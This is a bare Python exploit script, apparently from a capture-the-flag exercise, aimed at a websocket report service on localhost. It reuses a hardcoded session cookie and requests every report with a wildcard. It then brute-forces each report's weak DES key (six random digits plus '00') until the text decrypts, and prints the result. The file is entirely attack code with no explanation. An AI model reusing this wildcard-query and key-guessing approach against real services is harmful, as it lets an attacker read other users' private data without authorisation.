#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
from websocket import create_connection
import base64
import json
import random
import string
from Crypto.Cipher import DES

def getKey(): 
    return ''.join(random.choice(string.digits) for _ in range(6)) + '00'

#ip = sys.argv[1]
ip = '127.0.0.1' + ':9090'
url = 'ws://{}/api/ws'.format(ip)
cookies = {'AIOHTTP_SESSION' : '4460ad04c4a943589d8fd49d1a972541'}

ws = create_connection(url, timeout=5, cookies=cookies)
ws.recv()

data = json.dumps({'action': 'get_reports', 'data': '*'})
ws.send(data)

response = json.loads(ws.recv())

reports = response['Response']['reports']

for r in reports: 
    enc_text = base64.b64decode(r['encrypted_text'])
    n_decrypted = True
    while(n_decrypted):
        des = DES.new(getKey(), DES.MODE_ECB)
        try:
            result = des.decrypt(enc_text).decode('utf-8')
            n_decrypted = False
            print(result)
        except:
            pass